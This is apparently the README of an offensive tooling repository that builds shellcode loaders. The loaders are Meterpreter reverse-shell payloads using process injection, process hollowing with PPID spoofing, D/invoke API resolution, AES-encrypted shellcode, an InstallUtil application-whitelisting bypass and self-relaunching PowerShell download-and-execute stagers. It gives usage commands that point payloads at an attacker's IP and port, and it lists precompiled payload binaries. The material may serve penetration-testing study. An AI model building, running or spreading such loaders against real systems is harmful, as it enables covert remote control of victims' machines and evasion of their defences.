# Loaders - Shellcode

## ToC

| Application | Output | Notes |
| ----------- | ------ | ----- |
| `D_invoke/` | EXE | C# project that produces [D/invoke](https://github.com/TheWover/DInvoke) payloads |
| `clinject/` | EXE | C# project that has been modified to accept command line args for an **injected** reverse shell process |
| `clhollow/` | EXE | C# project that has been modified to accept command line args for an **hollowed** reverse shell process |
| `powershell/Powerinject.py` | PS | Python3 script to generate .PS1 payloads that perform process injection. |
| `powershell/Powerhollow.py` | PS | Python3 script to generate .PS1 payloads that perform process hollowing with PPID spoofing |
| `formatters/port_ipeggs.py` | TXT | Python3 script to format C# shellcode output by msfvenom into proper format for use with `Powerinject` & `Powerhollow` |
| `formatters/bin_to_vbappArray.py` | TXT | Python3 script to format raw `.bin` shellcode files into proper format for use in VBA Macros |
| `bins/x64_met_staged_reversetcp_inject.exe` | N/A | Command line args: IP PORT PROCESS_TO_INJECT(explorer) |
| `bins/x64_met_staged_reversetcp_hollow.exe` | N/A | Command line args: IP PORT PROCESS_TO_HOLLOW(c:\\windows\\system32\\svchost.exe) PPID_SPOOF(explorer) |
| `bins/x64_met_staged_reversehttps_inject.exe` | N/A | Command line args: IP PORT PROCESS_TO_INJECT(explorer) |
| `bins/x64_met_staged_reversehttps_hollow.exe` | N/A | Command line args: IP PORT PROCESS_TO_HOLLOW(c:\\windows\\system32\\svchost.exe) PPID_SPOOF(explorer)  |
| `formatters/formatshellcode.py` | TXT | Python3 script to format C# shellcode output by msfvenom into proper format for use with `Builder.exe` |

## [clinject](./clinject/Program.cs) and [clhollow](./clhollow/Program.cs)

These are C# projects that have been modified in order to accept command line `Lhost`, `Lport`, and processes for targeting.  This allows a user to drop the payload on whatever target machine without worry of needing to re-roll shellcode if the attackers IP changes, or the payload needs to be pointed at a different machine in order to hit a tunnel and egress the network.

This was accomplished by using Msfvenom to create shellcode and then locating the IP and port that was specified in the msfvenom command within the output shellcode.  These bytes were replaced with unique identifier strings.  This process was accomplished with the [Port_ipeggs.py](./formatters/portip_eggs.py) script, which finds the hex bytes for the specified IP/PORT combo in a `msfvenom -f csharp` output file and replaces them with `0x11,0x11,0x11,0x11` and `0x22,0x22` respectively.  

This shellcode was then AES encrypted and placed in the C# project.  On run time, the shellcode is decrypted and then the IP and port given by the attacker is converted to hex and placed in the proper location wthin the decyrpted shellcode as marked by the unique identifer strings.

> TODO: Original author notes that `port_ipeggs.py` "Does not work with all payloads. Confirmed works with reverse_tcp, confirmed DOES NOT work with HTTPS". This could be why the HTTPs payloads in `/bins/` don't work. FIX.

### clinject Usage
C# project source code for (IP + port + process) cli passed process injection payload. Use `multi/handler` with `windows/x64/meterpreter/reverse_tcp`
```cmd
clinject.exe 192.168.1.198 443 explorer
```

### clhollow Usage

C# project source code for (IP + port + process + parent-process) cli passed process hollowing payload. Use `multi/handler` with `windows/x64/meterpreter/reverse_tcp`
```cmd
clhollow.exe 192.168.1.198 443 c:\\windows\\system32\\svchost.exe explorer 
```

## [powerhollow.py](./powershell/powerhollow.py) and [powerinject.py](./powershell/powerinject.py)

These python scripts call `msfvenom` to generate shellcode, AES encrypt it, and then embed it within hardcoded powershell code in order to dynamically produce *.PS1* payloads according to user supplied options.  These *.PS1* payloads are modeled after the OSEP *.PS1* that utilizes dynamic lookup rather than `add-type` in order to prevent writing to disk when calling `csc`.  

`Powerinject.py` payloads succeed here; however I was unable to find a way to define the structs necessary for doing PPID spoofing with Process hollowing, so **add-type IS called in the `Powerhollow.py`** *.PS1* payloads, however this is only done for the necessesary structs and the `createproces()` Win32API. All other required API's are resolved dynamically.

In addition, `powerinject.py` payloads now detect if they are being run in a 32-bit PS context, and auto download-and-execute themselves in a 64-bit process. This is useful if your stager is ran from a 32-bit process (Word Macros), resulting in a 32-bit PS process. You can also use the `-D` argument to have the payload output useful debugging statements and help you determine where in the process of setting up the reverse shell it is failing.

Run the appropriate python script for the kind of payload you want to use and then place the produced files in your webserver directory and use the supplied PS one liner in order to call them. If you see in the debug output that its failing to open a process, try a couple times more. Sometimes there just isn't a suitable process to inject into but after a couple tries it finds one.

## [D_invoke](./D_invoke/Builder/Program.cs)

C# project that produces D/invoke payloads (basic, injector, hollower + ppid spoof) in exe, dll, or service exe format.  Use pre-built builder.exe in the D_Invoke directory.

This is a package built using TheWover's project and research as the foundation (https://github.com/TheWover/DInvoke, https://thewover.github.io/Dynamic-Invoke/).

The inspiration for this project was to simplify the process of generating compiled C# payloads.  By using this project, a user never need open visual studio when creating payloads.

### General Usage Steps

1. Generate shellcode
    - This was built with msfvenom shellcode in c# as the primary input, however it was retooled to take .bin files during some testing with CobaltStrike
    - i.e. it takes C# & binary input
2. Format the shellcode for use with `Builder.exe` using the [formatshellcode.py](./formatters/formatshellcode.py) script (for msfvenom shellcode)
3. Transfer formatted shellcode to your Windows dev machine
4. Run builder.exe with the proper switches
5. Voila. You have your AES encryped shellcode D/invoke payload in whatever format and technique you want!

### Details 

The foundation of this package is `Builder.exe`.  This application allows the user to specify several options to include:

1. Format of payload (`/F:`)
    - EXE, DLL, OR Service EXE
2. Technique (`/T:`)
    - Local injection
    - Remote injection
    - Process hollowing with PPID spoofing
3. Shellcode file (`/S:`)
    - File containing parsed shellcode
4. Process name (`/P:`)
    - Process to corrupt for injection
        - Must be pretty name, e.g. `explorer`
    - Process to spawn for hollowing
        - Must be absolute path, e.g. `c:\\windows\\system32\\svchost.exe` (escape backslashes)
5. Parent Process (`/X:`)
    - Process for PPID spoofing with process hollowing technique
        - Must be pretty name, e.g. `explorer`
6. Architecture (`/A:`)
    - x86 OR x64

After the user specifies all the above options, a "`template.cs`" file within the selected format project (exe, dll, service) will be edited and the payload pieced together.  `Builder.exe` has hardcoded within it the necessary code for the various options (d/invoke statements for hollowing w/ ppid spoofing for example) that will be placed into the template file in the proper manner in the given format (exe, dll, service exe).

Builder will AES-256 encrypt the shellcode (*generating a new key and IV each time it is run*) and embed the encrypted shellcode within the template file. Once the template file is complete, it will be saved over `program.cs` in the respective format project.  MSBuild will then be called on the updated `program.cs` file in order to create the final payload in exe, dll, or service exe format.

### Limitations

The produced payloads use D/invoke statements for most, *but not all* of the API calls. Certain simple ones (As well as certain complex ones in the process hollowing payload) still use `p/invoke`. An `Installutil` bypass is baked into each *.exe* payload for use in case application whitelisting is in place.

Additionally, direct *syscalls* have not been implemented in this project. It is maybe a direction for further work. However given that certain EDR's don't even hook userland syscalls anymore, I haven't done this yet as I need to do more research on the correct direction to go in the future. 

Note that this tool was developed for personal use, not production.  As such there are some shortcomings in that there are hardcoded paths where `Builder.exe` expects to find things:
1. `Builder.exe` should only be run from within the d/invoke folder
    - i.e. `builder.exe` should be in the same folder as the dll, exe, and service folders as it is on the hosted repo
2. Additionally, MSBuild is hardcoded for VS2019
    - If you are utilizing a different version, you will need to edit the source code of `Builder.exe` and update it with the path to MSBuild within your version.

## `/bins/`

This directory just holds precompiled binaries created with the `clhollow` and `clinject` projects using `windows/x64/meterpreter/reverse_https` and `windows/x64/meterpreter/reverse_tcp` payloads.
